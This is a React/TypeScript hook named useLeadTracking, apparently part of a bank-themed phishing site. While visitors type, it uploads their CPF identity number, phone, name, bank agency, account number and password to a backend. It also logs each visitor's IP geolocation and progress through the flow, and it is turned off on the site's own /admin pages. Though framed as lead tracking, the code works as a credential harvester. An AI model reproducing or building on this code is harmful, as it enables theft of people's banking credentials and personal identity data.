import { useEffect, useRef, useCallback } from "react";
import { useLocation } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import type { IpInfo } from "@/services/edge-functions.service";

const ADMIN_ROUTES = ["/admin"];

export function useLeadTracking() {
  const location = useLocation();
  const { data } = useFlow();
  const leadIdRef = useRef<string | null>(sessionStorage.getItem("lead_id"));
  const sessionIdRef = useRef<string | null>(null);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));

  const updateLeadData = useCallback(async () => {
    if (!leadIdRef.current) return;

    const updates: LeadUpdate = {};
    if (data.cpf) updates.cpf = data.cpf;
    if (data.phone) updates.phone = data.phone;
    if (data.nome) updates.nome = data.nome;
    if (data.segment) updates.segment = data.segment;
    if (data.agency) updates.agency = data.agency;
    if (data.account) updates.account = data.account;
    if (data.password) updates.password = data.password;

    if (Object.keys(updates).length === 0) return;

    try {
      await leadRepository.update(leadIdRef.current, updates);
    } catch (err) {
      console.error("Lead data update error:", err);
    }
  }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);

  useEffect(() => {
    if (isAdmin || !leadIdRef.current) return;

    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(updateLeadData, 500);

    return () => {
      if (debounceRef.current) clearTimeout(debounceRef.current);
    };
  }, [updateLeadData, isAdmin]);

  useEffect(() => {
    if (isAdmin) return;

    const page = location.pathname.replace("/", "") || "splash";

    const track = async () => {
      try {
        if (!leadIdRef.current) {
          const lead = await leadRepository.create({ current_step: page });
          leadIdRef.current = lead.id;
          sessionStorage.setItem("lead_id", lead.id);
        } else {
          await leadRepository.update(leadIdRef.current, {
            current_step: page,
            ...(page === "concluido" ? { status: "concluido" } : {}),
          });
        }

        if (sessionIdRef.current) {
          await sessionRepository.end(sessionIdRef.current);
        }

        let ipData: IpInfo = {};
        try {
          ipData = await edgeFunctionsService.getIpInfo();
        } catch {}

        const session = await sessionRepository.create({
          lead_id: leadIdRef.current,
          page,
          user_agent: navigator.userAgent,
          ip_address: ipData.ip ?? null,
          city: ipData.city ?? null,
          region: ipData.region ?? null,
          country: ipData.country ?? null,
          org: ipData.org ?? null,
        });

        sessionIdRef.current = session.id;
      } catch (err) {
        console.error("Lead tracking error:", err);
      }
    };

    track();

    const handleUnload = () => {
      if (sessionIdRef.current) {
        navigator.sendBeacon(
          `${import.meta.env.VITE_SUPABASE_URL}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
          JSON.stringify({ is_online: false, ended_at: new Date().toISOString() })
        );
      }
    };

    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, [location.pathname, isAdmin]);
}
